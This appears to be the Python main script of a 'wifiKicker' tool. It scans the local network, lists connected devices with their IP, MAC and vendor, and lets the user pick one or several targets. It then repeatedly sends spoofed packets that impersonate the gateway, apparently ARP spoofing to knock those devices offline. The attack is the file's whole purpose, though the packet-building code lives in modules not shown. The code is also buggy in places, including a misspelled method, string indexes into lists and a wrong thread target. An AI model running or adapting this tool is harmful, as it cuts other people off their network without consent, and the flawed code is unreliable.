#!/usr/bin/env python3

import os
import sys
import math
import traceback
import threading
import optparse
from time import sleep
from printUtils import PrintUtils
from printUtils import Color
import printUtils

from colorama import init
from scanner import Scanner
from spoof import Spoof
from network import Network

stop_animation=False

def one_spoof():
    global network
    os.system("clear||cls")

    print('{}ONE {}Spoof Out{}'.format(Color.RED,Color.YELLOW,Color.END))

    thread=threading.Thread(target=PrintUtils.scanning_animation,args=(PrintUtils,'SCAN',))
    thread.daemon=True
    thread.start()

    scanner=Scanner()
  

    scanner.stop_animation=True
    
    online_ips=network.get_online_IPs()
    printUtils.stop_animation=True
    thread.join()
   

    print('{}Online Devices: {}'.format(Color.YELLOW,Color.END))
        
    print('{}             IP                      MAC                     VENDOR'.format(Color.BLUE,Color.END))
    print('    __________________________________________________________________________\n')
    i=0
    
 

    for host in online_ips:
            
            print('{}[{}{}{}]      {}{}         {}         {}{}'.format(Color.GREEN,Color.RED,i,Color.GREEN,Color.YELLOW,host[0],host[1],network.vendors[i],Color.END))    
            i=i+1
    
   

    choice=int(input("\n Choose A Device: "))
    
    one_target_ip=online_ips[choice][0]
    one_target_mac=""
    for host in online_ips:
        print(host[0])
        print(one_target_ip)
        if(host[0]==one_target_ip):
            one_target_mac=host[1]

    if one_target_mac=="":
        print("\n{}IP address is not up. Please try again.{}".format(Color.RED,Color.END))
        return
    print("\n{}Target: {}{}".format(Color.GREEN, Color.END, one_target_ip))

    spoof=Spoof()
    try:
        printUtils.stop_animation=False
        thread=threading.Thread(target=PrintUtils.scanning_animation,args=(PrintUtils,'Spoof',))
        thread.setDaemon(True)
        thread.start()
        for t in range(10):
            spoof.send_packet(network.default_interface_mac,network.default_gateway_IP,one_target_ip,one_target_mac) 
            sleep(2)
        printUtils.stop_animation=True
        

        thread.join()
    except KeyboardInterrupt:
        print("\n{}stopping the process{}".format(Color.YELLOW,Color.END))
        os.system("clear||cls")
        return 


    

def multiple_spoof():
    global network
    os.system("clear||cls")

    print('{}ONE {}Spoof Out{}'.format(Color.RED,Color.YELLOW,Color.END))

    thread=threading.Thread(target=PrintUtils.scanning_animation,args=(PrintUtils,'SCAN',))
    thread.daemon=True
    thread.start()

    try:
        scanner=Scanner()
        scanner.scan_neighbours()
    except:
        print('ERROR : Could not scan netwrok'.format(Color.RED,Color.YELLOW,Color.END))

    scanner.stop_animation=True
    
    online_ips=network.get_online_ips()
    vendors=network.resolve_mac()

    print('{}Online Devices: {}'.format(Color.YELLOW,Color.END))
        
    print('{}             IP                      MAC                     VENDOR'.format(Color.BLUE,Color.END))
    print('    __________________________________________________________________________\n')
    i=0
    for host in zip(online_ips,scanner.host_list[1],vendors):
            
            print('{}[{}{}{}]      {}{}         {}         {}{}'.format(Color.GREEN,Color.RED,i,Color.GREEN,Color.YELLOW,host[0],host[1],host[2],Color.END))    
            i=i+1
    choices= input("\nChoose devices (comma-separated):")
    choices=choices.split(",")
    multiple_target_ip=[]
    for choice in choices:
        multiple_target_ip.append(online_ips[choice])
    multiple_target_mac=[]
    target_iterator=0
    for host in scanner.host_list:
        if(scanner.host_list[0]==multiple_target_ip[target_iterator]):
            multiple_target_mac.appen(host[1])
            target_iterator+=1

    if multiple_target_mac==None:
        print("\n{}IP address is not up. Please try again.{}".format(Color.RED,Color.END))
        return
    for target in multiple_target_ip:
        print("\n{}Target: {}{}".format(Color.GREEN, Color.END,target))

    spoof=Spoof()
    try:
        def spoof_thread_func(target_ip,target_mac):
            spoof=Spoof()
            for t in range(10):
                spoof.send_packet(network.default_interface_mac,network.default_gateway_IP,target_ip,target_mac)        
                sleep(10)
        spoof_thread=[]
        for i in range(len(multiple_target_ip)):
            spoof_thread.append(threading.Thread(target=spoof_thread, args=(multiple_target_ip[i],multiple_target_mac[i],)))
            spoof_thread[i].setDaemon(True)
            spoof_thread[i].start()
        
        for t in spoof_thread:
            t.join()
        
    except KeyboardInterrupt:
        print("\n{}stopping the process{}".format(Color.YELLOW,Color.END))
        os.system("clear||cls")
        return 

def all_spoof():
    pass


def one_limit():
    pass

def main_loop():
    PrintUtils.heading()
    global network
    network=Network()
    try:
        while True:
             
            PrintUtils.menu()
            choice =input()

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\n{}Have great day bruv'.format(Color.GREEN))
                raise SystemExit
            elif choice == 'O'or choice.upper() == 'O':
                one_spoof()
            elif choice == 'M'or choice.upper() == 'M':
                multiple_spoof()
            elif choice == 'A'or choice.upper() == 'A':
                all_spoof()
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            PrintUtils.heading()   
            
            

    except KeyboardInterrupt:
        print('\n{}Have great day bruv'.format(Color.GREEN))

if __name__ == "__main__":
    try:
        if os.geteuid()!=0 :
            print("\n"+"{}ERROR: RUN AGAIN WITH ROOT PRIVILEGES{}\n\t\t\t\t\tUSE: {}sudo wifiKicker.py ".format(Color.RED,Color.YELLOW,Color.GREEN,Color.END).center(153))
            exit()
    except:
        pass #for windows

    init()  # for colorama
   
    main_loop() # main program loop
    
    






